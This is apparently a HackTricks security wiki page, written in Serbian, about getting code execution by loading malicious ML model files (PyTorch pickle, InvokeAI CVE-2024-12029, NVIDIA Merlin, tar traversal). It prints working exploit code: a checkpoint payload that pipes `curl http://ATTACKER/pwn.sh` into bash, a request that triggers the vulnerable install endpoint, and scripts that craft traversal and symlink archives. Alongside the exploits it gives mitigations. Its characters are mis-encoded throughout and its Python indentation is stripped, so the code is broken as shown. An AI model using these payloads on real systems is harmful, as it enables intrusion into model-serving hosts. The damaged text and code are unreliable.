# Modeli RCE

{{#include ../banners/hacktricks-training.md}}

## Uƒçitavanje modela za RCE

Machine Learning modeli se obiƒçno dijele u razliƒçitim formatima, poput ONNX, TensorFlow, PyTorch, itd. Ti modeli mogu biti uƒçitani na developerske ma≈°ine ili proizvodne sisteme radi upotrebe. Obiƒçno modeli ne bi trebalo da sadr≈æe maliciozan kod, ali postoje sluƒçajevi gde model mo≈æe biti iskori≈°ƒáen da izvr≈°i arbitrarni kod na sistemu kao nameravana funkcionalnost ili zbog ranjivosti u biblioteci za uƒçitavanje modela.

U vreme pisanja, ovo su neki primeri ovog tipa ranjivosti:

| **Framework / Alat**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` ‚Üí code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow ‚Üí heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker‚Äôs `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays ‚Äì malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model‚Äôs external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker‚Äôs native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 ‚Ä¶ 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn‚Äôt cover old format ‚Äì ‚Äúdowngrade attack‚Äù) | |
| **Others** (general)        | *Design flaw* ‚Äì Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Pored toga, postoje neki python pickle-based modeli kao oni koji se koriste u [PyTorch](https://github.com/pytorch/pytorch/security) koji mogu biti iskori≈°ƒáeni za izvr≈°avanje arbitrarog koda na sistemu ako nisu uƒçitani sa `weights_only=True`. Dakle, bilo koji pickle-based model mo≈æe biti posebno podlo≈æan ovom tipu napada, ƒçak i ako nije naveden u tabeli iznad.

### üÜï  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 ‚Äì 5.4.2** izla≈æu REST endpoint `/api/v2/models/install` koji dozvoljava korisnicima preuzimanje i uƒçitavanje modela sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Ako je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvr≈°ava **pickle deserialization**. Po≈°to sadr≈æaj dolazi direktno sa URL-a kojim korisnik upravlja, napadaƒç mo≈æe u checkpoint ubaciti maliciozni objekat sa prilagoƒëenom `__reduce__` metodom; ta metoda se izvr≈°ava **during deserialization**, ≈°to dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranljivost je dodeljena **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Koraci eksploatacije

1. Napravite maliciozni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostujte `payload.ckpt` na HTTP serveru koji kontroli≈°ete (npr. `http://ATTACKER/payload.ckpt`).
3. Pokrenite ranjiv endpoint (autentifikacija nije potrebna):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, pozove `torch.load()` ‚Üí `os.system` gadget se pokreƒáe i napadaƒç dobija izvr≈°avanje koda u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

‚Ä¢  InvokeAI 5.3.1-5.4.2 (scan flag podrazumevano **false**)  
‚Ä¢  `/api/v2/models/install` dostupan napadaƒçu  
‚Ä¢  Proces ima dozvole za izvr≈°avanje shell komandi

#### Mitigacije

* A≈æurirajte na **InvokeAI ‚â• 5.4.3** ‚Äì zakrpa postavlja `scan=True` po defaultu i izvr≈°ava skeniranje za malver pre deserializacije.  
* Prilikom programskog uƒçitavanja checkpoint-ova koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Primeni allow-lists / potpise za izvore modela i pokreni servis sa najmanjim potrebnim privilegijama.

> ‚ö†Ô∏è Zapamtite da je **bilo koji** Python pickle-baziran format (ukljuƒçujuƒái mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) su≈°tinski nesiguran za deserializaciju iz nepouzdanih izvora.

---

Primer ad-hoc mitigacije ako morate zadr≈æati starije InvokeAI verzije koje rade iza reverse proxy-ja:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### üÜï NVIDIA Merlin Transformers4Rec RCE zbog nesigurnog `torch.load` (CVE-2025-23298)

NVIDIA-ina Transformers4Rec (deo Merlina) izlo≈æila je nesiguran loader checkpoint-a koji je direktno pozivao `torch.load()` na putanjama koje je obezbedio korisnik. Po≈°to `torch.load` zavisi od Python `pickle`, checkpoint pod kontrolom napadaƒça mo≈æe da izvr≈°i proizvoljan kod preko reducera tokom deserializacije.

Ranjiv put (pre-fix): `transformers4rec/torch/trainer/trainer.py` ‚Üí `load_model_trainer_states_from_checkpoint(...)` ‚Üí `torch.load(...)`.

Za≈°to ovo dovodi do RCE: U Python `pickle`, objekat mo≈æe da defini≈°e reducer (`__reduce__`/`__setstate__`) koji vraƒáa callable i argumente. Taj callable se izvr≈°ava tokom deserializacije. Ako se takav objekat nalazi u checkpoint-u, on se izvr≈°ava pre nego ≈°to se koriste bilo koje te≈æine.

Minimalni maliciozni checkpoint primer:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i razmera uticaja:
- Trojanizovani checkpoints/modeli deljeni putem repos, buckets ili artifact registries
- Automatizovani resume/deploy pipelines koji automatski uƒçitavaju checkpoints
- Izvr≈°avanje se de≈°ava unutar training/inference workers, ƒçesto sa povi≈°enim privilegijama (npr. root u containerima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktno `torch.load()` ograniƒçenim, allow-listed deserializer-om implementiranim u `transformers4rec/utils/serialization.py`. Novi loader validira tipove/polja i spreƒçava da se proizvoljni callables pozivaju tokom uƒçitavanja.

Preporuke za odbranu specifiƒçne za PyTorch checkpoints:
- Ne unpickle-ujte nepouzdane podatke. Preferirajte neizvr≈°ne formate kao ≈°to su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX kad je to moguƒáe.
- Ako morate koristiti PyTorch serialization, obezbedite `weights_only=True` (podr≈æano u novijim PyTorch verzijama) ili koristite prilagoƒëeni allow-listed unpickler sliƒçan Transformers4Rec patchu.
- Obezbedite model provenance/signatures i sandbox deserializaciju (seccomp/AppArmor; non-root user; ograniƒçen FS i bez network egress).
- Pratite neoƒçekivane child procese iz ML servisa tokom uƒçitavanja checkpoint-a; trace-ujte `torch.load()`/`pickle` kori≈°ƒáenje.

POC i reference na ranjivosti/patch:
- Ranjiv pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Maliciozni checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Primer ‚Äì kreiranje malicioznog PyTorch modela

- Napravite model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Uƒçitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modeli za Path Traversal

Kao ≈°to je navedeno u [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), veƒáina formata modela koje koriste razliƒçiti AI framework-ovi zasnovana je na arhivama, obiƒçno `.zip`. Stoga je moguƒáe zloupotrebiti ove formate da se izvr≈°e path traversal attacks, ≈°to omoguƒáava ƒçitanje proizvoljnih fajlova sa sistema na kojem se model uƒçitava.

Na primer, sledeƒáim kodom mo≈æete napraviti model koji ƒáe, pri uƒçitavanju, kreirati fajl u direktorijumu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, pomoƒáu sledeƒáeg koda mo≈æete kreirati model koji ƒáe prilikom uƒçitavanja napraviti symlink ka direktorijumu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Detaljna analiza: Keras .keras deserialization and gadget hunting

Za fokusiran vodiƒç o .keras internals, Lambda-layer RCE, the arbitrary import issue in ‚â§ 3.8, and post-fix gadget discovery inside the allowlist, see:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Izvori

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog ‚Äì CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
